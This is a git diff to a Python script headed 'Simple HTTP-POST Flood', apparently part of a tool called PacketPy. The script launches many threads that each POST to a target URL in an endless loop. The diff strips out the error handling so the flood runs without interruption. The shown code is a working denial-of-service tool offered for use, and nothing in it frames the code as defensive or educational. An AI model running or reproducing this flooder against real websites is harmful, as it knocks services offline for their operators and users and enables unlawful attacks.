@@ -1,7 +1,7 @@
 # Simple HTTP-POST Flood python script
 # Standalone PacketPy script
 # https://github.com/fortless
-# Base written by https://github.com/awaitclone
+# Base by https://github.com/awaitclone
 
 version = '1.1-01_beta' # Don't touch this
 
@@ -42,11 +42,8 @@ if postdata == '':
     postdata = 'abcdefABCDEF'
 def dos(target):
     while True:
-        try:
-            res = requests.post(url, data={'requesting': str(postdata),}) 
-        except requests.exceptions.ConnectionError:
-            clearterminal()
-            printinfo()
+            requests.post(url, data={'requesting': str(postdata),}) 
+
 clearterminal()
 print("-----------------------------------------")
 print("")
@@ -64,29 +61,10 @@ print("Python.")
 print("")
 print("Interactive mode (HTTP Flood)")
 print("")
-print("---> Press CTRL+C to stop the payload!")
 print("-----------------------------------------")
-
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     try:
         thr.start()
     except KeyboardInterrupt:
-        clearterminal()
-        print("-----------------------------------------")
-        print("")
-        print(" -=- HTTP payload stopped! -=-")
-        print("")
-        print("")
-        print("- Target URL: " + str(url)+ " -")
-        print("- HTTP Payload: " + str(postdata))
-        print("- OS: " + str(os.name) + " -")
-        print("- PacketPy version: " + str(version) + " -")
-        print("")
-        print("PacketPy, an open-source")
-        print("network tool library, written in")
-        print("Python.")
-        print("")
-        print("Interactive mode (HTTP Flood)")
-        print("")
-        print("-----------------------------------------")
+        print("Payload stopped!")
